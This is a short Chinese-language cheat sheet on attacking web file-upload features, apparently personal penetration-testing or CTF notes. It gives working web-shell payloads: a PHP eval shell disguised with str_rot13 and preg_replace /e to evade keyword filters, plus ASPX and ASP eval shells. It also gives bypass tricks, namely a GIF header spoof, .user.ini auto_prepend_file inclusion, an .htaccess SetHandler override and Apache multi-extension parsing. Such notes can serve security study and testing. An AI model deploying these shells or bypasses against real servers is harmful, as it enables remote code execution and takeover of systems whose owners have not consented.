# Upload

* ### 上传图片马

burp抓包更改后缀（php，html，js，aspx，.htaccess）

注意文件头：

```
GIF98a //GIF文件头
```

* #### 关键字屏蔽绕过：

```
<?php=
```

```
<?php

?>
```

```
<script language="php"></script>
```

上面的三句话等价

屏蔽eval、assert等木马关键字时，通过加密解密进行绕过

```
<?php 
$exp = $_POST['shell'];
@preg_replace('/ad/e','@'.str_rot13('riny').'($exp)', 'add');
?>    //等同于php一句话<?php eval($_POST[shell]);?>
```

aspx木马

```
<%@ Page Language="Jscript"%><%eval(Request.Item["shell"],"unsafe");%>
```

asp木马

```
<%eval request("shell")%>
```

特殊：通过上传.user.ini内部增加文件自动包含进行传马攻击

```
Auto_prepend_file=2.jpg
```

.htaccess强制用php进行解析

```
SetHandler application/x-httpd-php
```

Apache的解析机制绕过

APACHE默认文件名中可以带.号，当解析文件遇到.号时，从右至左依次解析。比如：test.php.xxx.aaa，.xxx和.aaa这两种后缀是apache不可识别解析,apache就会把test.php.xxx.aaa解析成test.php

